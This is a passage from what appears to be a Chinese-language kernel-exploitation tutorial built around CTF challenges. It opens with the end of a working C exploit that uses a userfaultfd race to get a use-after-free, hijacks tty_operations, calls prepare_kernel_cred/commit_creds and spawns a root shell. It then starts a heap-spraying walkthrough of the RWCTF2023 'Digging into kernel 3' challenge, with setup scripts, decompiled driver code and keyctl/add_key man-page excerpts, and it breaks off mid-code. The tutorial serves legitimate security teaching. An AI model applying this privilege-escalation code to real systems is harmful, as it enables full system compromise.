uffd_arg)</span>&#123;<br>  sem_wait(&amp;evil_edit_sem);<br>  editnote(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, uffd_arg);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  bind_cpu(<span class="hljs-number">0</span>);<br>  page_size = sysconf(_SC_PAGE_SIZE);<br>  note_fd = open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-type">size_t</span> fake_tty_struct[<span class="hljs-number">0x100</span>], orig_tty_struct[<span class="hljs-number">0x100</span>];<br>  <span class="hljs-type">size_t</span> fake_tty_operations_addr;<br>  <span class="hljs-type">size_t</span> vmlinux_offset;<br>  <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>  <span class="hljs-comment">/* construct a monitored zone */</span><br>  <span class="hljs-type">char</span>* user_mmap = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>  userfaultfd_attack(user_mmap, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>  <span class="hljs-comment">/*init the semaphore, and the value firstly be given a zero*/</span><br>  sem_init(&amp;evil_add_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  sem_init(&amp;evil_edit_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-type">pthread_t</span> thread_1, thread_2;<br><br>  pthread_create(&amp;thread_1, <span class="hljs-literal">NULL</span>, thread_add, (<span class="hljs-type">void</span>*)user_mmap);<br>  pthread_create(&amp;thread_2, <span class="hljs-literal">NULL</span>, thread_edit, (<span class="hljs-type">void</span>*)user_mmap);<br>  <br>  addnote(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, buf);<br>  editnote(<span class="hljs-number">0</span>, <span class="hljs-number">0x2e0</span>, buf);<br><br>  sem_post(&amp;evil_edit_sem);     <span class="hljs-comment">//we could run the thread_edit to get a UAF</span><br>  sleep(<span class="hljs-number">1</span>);<br><br>  sem_post(&amp;evil_add_sem);      <span class="hljs-comment">//use that to modify the size for 0 to not 0</span><br>  sleep(<span class="hljs-number">1</span>);  <br>  <span class="hljs-comment">/* now we get a UAF chunk(0x2e0) with no zero size, so we can get the tty_struct*/</span><br>  info_log(<span class="hljs-string">&quot;try to get the tty_struct&quot;</span>);<br>  tty_fd = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">if</span>(tty_fd &lt;=<span class="hljs-number">0</span>)&#123;<br>    error_log(<span class="hljs-string">&quot;ptmx open failed&quot;</span>);<br>  &#125;<br>  read(note_fd, orig_tty_struct, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span>(*(<span class="hljs-type">int</span>*)orig_tty_struct != <span class="hljs-number">0x5401</span>)&#123;     <span class="hljs-comment">//mey be failed</span><br>    error_log(<span class="hljs-string">&quot;pity,get a wrong tty!&quot;</span>);<br>  &#125;<br>  info_log(<span class="hljs-string">&quot;get right tty_struct!congratulation!&quot;</span>);<br><br>  <span class="hljs-comment">/* get the kernel base offset */</span><br>  vmlinux_offset = ((orig_tty_struct[<span class="hljs-number">3</span>]&amp;<span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x440</span>) ? (orig_tty_struct[<span class="hljs-number">3</span>] - PTM_UNIX98_OPS): (orig_tty_struct[<span class="hljs-number">3</span>] - PTY_UNIX98_OPS);<br>  PRINT_ADDR(<span class="hljs-string">&quot;vmlinux_offset&quot;</span>, vmlinux_offset);<br><br>  <span class="hljs-comment">/* hijack the tty_operations */</span><br>  <span class="hljs-built_in">memcpy</span>(fake_tty_struct, orig_tty_struct, <span class="hljs-number">0x100</span>);<br>  addnote(<span class="hljs-number">1</span>, <span class="hljs-number">0x60</span>, buf); <br>  editnote(<span class="hljs-number">1</span>, <span class="hljs-number">0x2e0</span>, buf);<br>  gift(buf);<br>  fake_tty_operations_addr = buf[<span class="hljs-number">2</span>];<br>  fake_tty_struct[<span class="hljs-number">3</span>] = buf[<span class="hljs-number">2</span>];<br><br>  PRINT_ADDR(<span class="hljs-string">&quot;fake_tty_fops&quot;</span>, fake_tty_struct[<span class="hljs-number">3</span>]);<br>  write(note_fd, fake_tty_struct,<span class="hljs-number">0</span>);<br>  buf[<span class="hljs-number">12</span>] = WORK_FOR_CPU_FN + vmlinux_offset;<br>  write(note_fd, buf, <span class="hljs-number">1</span>);<br>  info_log(<span class="hljs-string">&quot;hijack done !&quot;</span>);<br><br>  <span class="hljs-comment">/* construct the gadget */</span><br>  <span class="hljs-comment">/* prepare_kernel_cred(NULL) */</span><br>  <span class="hljs-built_in">memcpy</span>(fake_tty_struct, orig_tty_struct, <span class="hljs-number">0x2e0</span>);<br>  fake_tty_struct[<span class="hljs-number">3</span>] = fake_tty_operations_addr;<br>  fake_tty_struct[<span class="hljs-number">4</span>] = PREPARE_KERNEL_CRED + vmlinux_offset;<br>  fake_tty_struct[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>  write(note_fd, fake_tty_struct, <span class="hljs-number">0</span>);<br>  ioctl(tty_fd, <span class="hljs-number">0x114514</span>, <span class="hljs-number">0x114514</span>);<br><br>  <span class="hljs-comment">/* commit_creds */</span><br>  read(note_fd, buf, <span class="hljs-number">0</span>);<br>  fake_tty_struct[<span class="hljs-number">5</span>] = buf[<span class="hljs-number">6</span>];<br>  fake_tty_struct[<span class="hljs-number">4</span>] = COMMIT_CREDS + vmlinux_offset;<br>  write(note_fd, fake_tty_struct, <span class="hljs-number">0</span>);<br>  ioctl(tty_fd, <span class="hljs-number">0x123</span>, <span class="hljs-number">0x123</span>);<br>  <br>  <span class="hljs-comment">/* previledge evaluation finished */</span><br>  <span class="hljs-comment">/* recover the tty_struct */</span><br>  write(note_fd, orig_tty_struct, <span class="hljs-number">0</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="五、Kernel-Heap-Heap-Spraying堆喷"><a href="#五、Kernel-Heap-Heap-Spraying堆喷" class="headerlink" title="五、Kernel Heap - Heap Spraying堆喷"></a>五、Kernel Heap - Heap Spraying堆喷</h1><blockquote><p>In <a href="https://en.wikipedia.org/wiki/Computer_security">computer security</a>, <strong>heap spraying</strong> is a technique used in <a href="https://en.wikipedia.org/wiki/Exploit_(computer_security)">exploits</a> to facilitate <a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution">arbitrary code execution</a>. The part of the <a href="https://en.wikipedia.org/wiki/Source_code">source code</a> of an exploit that implements this technique is called a <strong>heap spray</strong>.[<a href="https://en.wikipedia.org/wiki/Heap_spraying#cite_note-1">1]</a> In general, code that <em>sprays the heap</em> attempts to put a certain sequence of bytes at a predetermined location in the <a href="https://en.wikipedia.org/wiki/Random_access_memory">memory</a> of a target <a href="https://en.wikipedia.org/wiki/Process_(computing)">process</a> by having it allocate (large) blocks on the process’s <a href="https://en.wikipedia.org/wiki/Heap_(programming)">heap</a> and fill the bytes in these blocks with the right values.</p></blockquote><p>以上为wikipedia原文，其中介绍heap spray这项技术，普遍上，喷射到堆上面的代码尝试通过在目标进程堆分配大块并且在这些块当中布置恰当的值，来在提前预测的内存地点构造一个确定的字节序列。</p><p>堆喷这项技术并不是一个实质上的漏洞利用技术，而是一种辅助增强技术，也就是在程序存在明确漏洞但是难以利用的情况下，可以通过这类辅助技术来方便我们的漏洞利用，下面我们将通过例题来学习</p><h2 id="例题：RWCTF2023体验赛-Digging-into-kernel-3"><a href="#例题：RWCTF2023体验赛-Digging-into-kernel-3" class="headerlink" title="例题：RWCTF2023体验赛 - Digging into kernel 3"></a>例题：RWCTF2023体验赛 - Digging into kernel 3</h2><h3 id="1-题目逆向-2"><a href="#1-题目逆向-2" class="headerlink" title="1.题目逆向"></a>1.题目逆向</h3><p>首先就是启动脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span>                                                                               <br>                                                                                        <br>qemu-system-x86_64 \                                                                    <br>        -m 128M \                                                                       <br>        -nographic \                                                                    <br>        -kernel ./bzImage \                                                             <br>   --enable-kvm \                                                                        <br>        -initrd ./rootfs.img \                                                          <br>        -cpu kvm64,+smap,+smep \                                                        <br>        -monitor /dev/null \                                                            <br>        -append &#x27;console=ttyS0 kaslr kpti=1 quiet oops=panic panic=1 init=/init&#x27; \    <br>        -no-reboot \                                                                    <br>        -snapshot \                                                                     <br>        -s                                                                              <br><br></code></pre></td></tr></table></figure><p>基本上都开了，但是这里存在一个调试问题，在开启硬件加速后<code>--enable-kvm</code>，会导致gdb远程调试进入死中断，只要gdb发出了断点，内核就会进行处理，然后gdb再次恢复环境的时候再次触发内核中断(这仅仅是我个人的理解)，所以如果你只(n&#x2F;s)就会无限循环在同一行代码，但是你会发现如果你打断点在之后的代码他又会运行到那儿，但情况跟刚刚会完全一致，具体情况如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/a6efce1b9d16fdfa26c53221f18f8c5495ee7b50.jpg"></p><p>而要解决这个问题，在我的ubuntu20.04上只需要关闭硬件加速即可</p><p>然后就是我们文件系统的脚本init</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span>                                                    <br>                                                             <br>mkdir /tmp                                                   <br>mount -t proc none /proc                                     <br>mount -t sysfs none /sys                                     <br>mount -t devtmpfs none /dev                                  <br>mount -t tmpfs none /tmp                                     <br>                                                             <br>exec 0&lt;/dev/console                                          <br>exec 1&gt;/dev/console                                          <br>exec 2&gt;/dev/console                                          <br>                                                             <br>insmod /rwctf.ko                                             <br>chmod 666 /dev/rwctf                                         <br>chmod 700 /flag                                              <br>chmod 400 /proc/kallsyms                                     <br>                                                             <br>echo 1 &gt; /proc/sys/kernel/kptr_restrict                      <br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict                     <br>                                                             <br>poweroff -d 120 -f &amp;                                        <br>                                                             <br>echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;    <br><span class="hljs-meta prompt_">#</span><span class="language-bash">setsid /bin/cttyhack setuidgid 0 /bin/sh</span>                    <br>setsid /bin/cttyhack setuidgid 1000 /bin/sh                  <br>                                                             <br>umount /proc                                                 <br>umount /sys                                                  <br>umount /tmp                                                  <br>                                                             <br>poweroff -d 0 -f                                             <br><br></code></pre></td></tr></table></figure><p>插入了一个模块<code>rwctf.ko</code></p><p>题目中所实现的函数仅仅只有以下几个：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rwmod_release</span>.text        <span class="hljs-number">0000000000000000</span><span class="hljs-number">00000007</span>R.......<br><span class="hljs-attribute">rwmod_ioctl</span>    .text        <span class="hljs-number">0000000000000010</span><span class="hljs-number">0000010</span>D<span class="hljs-number">00000038</span>R....B..<br><span class="hljs-attribute">rwmod_open</span>    .text.unlikely<span class="hljs-number">000000000000011</span>D<span class="hljs-number">00000013</span>R.......<br><span class="hljs-attribute">rwmod_init</span>    .init.text    <span class="hljs-number">0000000000000130</span><span class="hljs-number">0000004</span>F<span class="hljs-number">00000008</span>R.......<br><span class="hljs-attribute">rwmod_exit</span>    .exit.text    <span class="hljs-number">000000000000017</span>F<span class="hljs-number">0000000</span>CR.......<br></code></pre></td></tr></table></figure><p>其中比较重要的核心点就是<code>rwmod_ioctl</code>函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">rwmod_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, __int64 userarg)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// r12</span><br>  __int64 v5; <span class="hljs-comment">// rbx</span><br>  __int64 kmalloc_ptr; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span><br>  <span class="hljs-type">void</span> *buffer; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v10; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br><br>  v10 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( !userarg )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1LL</span>;<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0xC0DECAFE</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !copy_from_user(&amp;idx, userarg, <span class="hljs-number">16LL</span>) &amp;&amp; idx &lt;= <span class="hljs-number">1</span> )<br>      kfree(buf[idx]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  v3 = <span class="hljs-number">-1LL</span>;<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0xDEADBEEF</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( copy_from_user(&amp;idx, userarg, <span class="hljs-number">16LL</span>) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    v5 = idx;<br>    <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    buf[v5] = _kmalloc(size, <span class="hljs-number">3520LL</span>);<br>    kmalloc_ptr = buf[idx];<br>    <span class="hljs-keyword">if</span> ( !kmalloc_ptr )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x7FFFFFFF</span>uLL )<br>      BUG();<br>    <span class="hljs-keyword">if</span> ( copy_from_user(kmalloc_ptr, buffer, size) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们传入的参数为下面的结构体</p><table><thead><tr><th align="center">userarg(0x16)</th></tr></thead><tbody><tr><td align="center">idx(0x4)</td></tr><tr><td align="center">size(0x4)</td></tr><tr><td align="center">buffer(0x8)</td></tr></tbody></table><p>然后有两个选项</p><ol><li><p>0xC0DECAFE: kfree块，但存在悬垂指针</p></li><li><p>0xDEADBEEF: 按照传入的size来kmalloc一定大小的块</p></li></ol><p>所以这里我们可以看到程序是存在很多个UAF</p><h3 id="2-add-key基础知识"><a href="#2-add-key基础知识" class="headerlink" title="2.add_key基础知识"></a>2.add_key基础知识</h3><p>内核中存在一个密钥管理系统，他通过keyctl这个系统调用提供的接口来进行读取、修改、注销等功能，如下是linux手册当中的解释</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs verilog">NAME<br>       keyctl - manipulate the kernel&#x27;s key management facility<br><br>SYNOPSIS<br>       #<span class="hljs-keyword">include</span> &lt;sys/types<span class="hljs-variable">.h</span>&gt;<br>       #<span class="hljs-keyword">include</span> &lt;keyutils<span class="hljs-variable">.h</span>&gt;<br><br>       long keyctl(<span class="hljs-keyword">int</span> operation, ...)<br><br>       <span class="hljs-comment">/* For direct call via syscall(2): */</span><br>       #<span class="hljs-keyword">include</span> &lt;asm/unistd<span class="hljs-variable">.h</span>&gt;<br>       #<span class="hljs-keyword">include</span> &lt;linux/keyctl<span class="hljs-variable">.h</span>&gt;<br>       #<span class="hljs-keyword">include</span> &lt;unistd<span class="hljs-variable">.h</span>&gt;<br><br>       long syscall(__NR_keyctl, <span class="hljs-keyword">int</span> operation, __kernel_ulong_t arg2,<br>                    __kernel_ulong_t arg3, __kernel_ulong_t arg4,<br>                    __kernel_ulong_t arg5);<br><br>       No glibc wrapper is provided <span class="hljs-keyword">for</span> <span class="hljs-keyword">this</span> system call; see NOTES.<br><br>DESCRIPTION<br>       keyctl() allows user-space programs to perform key manipulation. <span class="hljs-comment">//允许用户进行密钥操作</span><br><br>       The  operation  performed by keyctl() is determined by the value of the operation argument.  Each of these operations is wrapped by the libkeyutils <span class="hljs-keyword">library</span> (provided by the keyutils <span class="hljs-keyword">package</span>) into individual functions<br>       (noted below) to permit the compiler to check types.<br><br>NOTES<br>       No wrapper <span class="hljs-keyword">for</span> <span class="hljs-keyword">this</span> system call is provided in glibc.  A wrapper is provided in the libkeyutils <span class="hljs-keyword">library</span>.  When employing the wrapper in that <span class="hljs-keyword">library</span>, link <span class="hljs-keyword">with</span> -lkeyutils.  However, rather than using <span class="hljs-keyword">this</span> system call<br>       directly, you probably want to <span class="hljs-keyword">use</span> the various <span class="hljs-keyword">library</span> functions mentioned in the descriptions of individual operations above.<br><br></code></pre></td></tr></table></figure><p>通过描述我们可以简单的了解到他是为了迁就用户空间来使用密钥相关的操作，还有一个需要注意的点那就是glibc不包含该系统调用，需要链接的时候额外加上<code>-lkeyutils</code>链接外部包才可以使用它。</p><p>我们知道了密钥管理的相关系统调用，那这个密钥从哪儿来呢？同样，内核提供了另一个系统调用<code>add_key()</code>来创建密钥，解释如下：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">NAME<br>       add_key - add a <span class="hljs-keyword">key</span> <span class="hljs-keyword">to</span> the kernel<span class="hljs-comment">&#x27;s key management facility</span><br><br>SYNOPSIS<br>       #include &lt;sys/types.h&gt;<br>       #include &lt;keyutils.h&gt;<br><br>       key_serial_t add_key(<span class="hljs-keyword">const</span> <span class="hljs-type">char</span> *type, <span class="hljs-keyword">const</span> <span class="hljs-type">char</span> *description,<br>                            <span class="hljs-keyword">const</span> void *payload, size_t plen,<br>                            key_serial_t keyring);<br><br>       No glibc wrapper <span class="hljs-built_in">is</span> provided <span class="hljs-keyword">for</span> this system <span class="hljs-keyword">call</span>; see NOTES.<br><br>DESCRIPTION<br>       add_key() creates <span class="hljs-built_in">or</span> updates a <span class="hljs-keyword">key</span> <span class="hljs-keyword">of</span> the given type <span class="hljs-built_in">and</span> description, instantiates it <span class="hljs-keyword">with</span> the payload <span class="hljs-keyword">of</span> length plen, attaches it <span class="hljs-keyword">to</span> the nominated keyring, <span class="hljs-built_in">and</span> returns the <span class="hljs-keyword">key</span><span class="hljs-comment">&#x27;s serial number.</span><br><br>       The <span class="hljs-keyword">key</span> may be rejected <span class="hljs-keyword">if</span> the provided data <span class="hljs-built_in">is</span> <span class="hljs-keyword">in</span> the wrong format <span class="hljs-built_in">or</span> it <span class="hljs-built_in">is</span> invalid <span class="hljs-keyword">in</span> some other way.<br><br>       <span class="hljs-keyword">If</span>  the  destination  keyring already contains a <span class="hljs-keyword">key</span> that matches the specified type <span class="hljs-built_in">and</span> description, <span class="hljs-keyword">then</span>, <span class="hljs-keyword">if</span> the <span class="hljs-keyword">key</span> type supports it, that <span class="hljs-keyword">key</span> will be updated rather than a <span class="hljs-built_in">new</span> <span class="hljs-keyword">key</span> being created; <span class="hljs-keyword">if</span> <span class="hljs-built_in">not</span>, a <span class="hljs-built_in">new</span> <span class="hljs-keyword">key</span><br>       (<span class="hljs-keyword">with</span> a different ID) will be created <span class="hljs-built_in">and</span> it will displace the link <span class="hljs-keyword">to</span> the extant <span class="hljs-keyword">key</span> <span class="hljs-keyword">from</span> the keyring.<br><br>       The destination keyring serial number may be that <span class="hljs-keyword">of</span> a valid keyring <span class="hljs-keyword">for</span> which the caller has write permission.  Alternatively, it may be one <span class="hljs-keyword">of</span> the following special keyring IDs:<br><br>       KEY_SPEC_THREAD_KEYRING<br>              This specifies the caller<span class="hljs-comment">&#x27;s thread-specific keyring (thread-keyring(7)).</span><br><br>       KEY_SPEC_PROCESS_KEYRING<br>              This specifies the caller<span class="hljs-comment">&#x27;s process-specific keyring (process-keyring(7)).</span><br><br>       KEY_SPEC_SESSION_KEYRING<br>              This specifies the caller<span class="hljs-comment">&#x27;s session-specific keyring (session-keyring(7)).</span><br><br>       KEY_SPEC_USER_KEYRING<br>              This specifies the caller<span class="hljs-comment">&#x27;s UID-specific keyring (user-keyring(7)).</span><br><br>       KEY_SPEC_USER_SESSION_KEYRING<br>              This specifies the caller<span class="hljs-comment">&#x27;s UID-session keyring (user-session-keyring(7)).</span><br><br></code></pre></td></tr></table></figure><p>add_key() 创建或更新给定类型和描述的密钥，使用长度为 plen 的有效负载实例化它，将其附加到指定的keyring，并返回密钥的序列号。如果提供的数据格式错误或在其他方面无效，则密钥可能会被拒绝。</p><p>如果目标keyring已包含与指定类型和描述匹配的密钥，那么，如果密钥类型支持它，则将更新该密钥，而不是创建新密钥； 如果没有，则使用新密钥（使用不同的 ID）将被创建，并将替换keyring中现有密钥的链接。目的地keyring序列号可以是调用者具有写入权限的有效密钥环的序列号。</p><p>这里来简单解释以下keyring是什么：直译过来就是钥匙环，也就是咱们平时挂钥匙的地方，也算得上是一个钥匙们的集合，使用它可以方便咱们密钥的分类管理，他基本上给钥匙分了以下三类：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs applescript">(+) <span class="hljs-string">&quot;keyring&quot;</span><br><br>Keyrings are special keys <span class="hljs-keyword">that</span> <span class="hljs-keyword">contain</span> a <span class="hljs-built_in">list</span> <span class="hljs-keyword">of</span> other keys. Keyring<br>lists can be modified using various system calls. Keyrings should <span class="hljs-keyword">not</span><br>be <span class="hljs-keyword">given</span> a payload when created.<br><br>(+) <span class="hljs-string">&quot;user&quot;</span><br><br>A key <span class="hljs-keyword">of</span> this type has a description <span class="hljs-keyword">and</span> a payload <span class="hljs-keyword">that</span> are arbitrary<br>blobs <span class="hljs-keyword">of</span> data. These can be created, updated <span class="hljs-keyword">and</span> <span class="hljs-built_in">read</span> <span class="hljs-keyword">by</span> userspace,<br><span class="hljs-keyword">and</span> aren&#x27;t intended <span class="hljs-keyword">for</span> use <span class="hljs-keyword">by</span> kernel services.<br><br>(+) <span class="hljs-string">&quot;logon&quot;</span><br><br>Like a <span class="hljs-string">&quot;user&quot;</span> key, a <span class="hljs-string">&quot;logon&quot;</span> key has a payload <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> an arbitrary<br>blob <span class="hljs-keyword">of</span> data. It <span class="hljs-keyword">is</span> intended <span class="hljs-keyword">as</span> a place <span class="hljs-keyword">to</span> store secrets which are<br>accessible <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> kernel <span class="hljs-keyword">but</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">to</span> userspace programs.<br><br>The description can be arbitrary, <span class="hljs-keyword">but</span> must be prefixed <span class="hljs-keyword">with</span> a non-zero<br><span class="hljs-built_in">length</span> <span class="hljs-built_in">string</span> <span class="hljs-keyword">that</span> describes <span class="hljs-keyword">the</span> key <span class="hljs-string">&quot;subclass&quot;</span>. The subclass <span class="hljs-keyword">is</span><br>separated <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">rest</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> description <span class="hljs-keyword">by</span> a &#x27;:&#x27;. <span class="hljs-string">&quot;logon&quot;</span> keys can<br>be created <span class="hljs-keyword">and</span> updated <span class="hljs-keyword">from</span> userspace, <span class="hljs-keyword">but</span> <span class="hljs-keyword">the</span> payload <span class="hljs-keyword">is</span> only<br>readable <span class="hljs-keyword">from</span> kernel <span class="hljs-literal">space</span>.<br><br></code></pre></td></tr></table></figure><p>找系统调用的方法如下几步：</p><ol><li>内核源码<code>include/linux/syscalls.h</code></li><li>找到对应的系统调用，然后一般上面会有注释在哪个文件夹下</li><li>新版本系统调用一般实现为<code>SYSCALL_DEFINE&lt;x&gt;(系统调用名, ...)</code>，老版本一般为<code>sys_open()</code>等。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 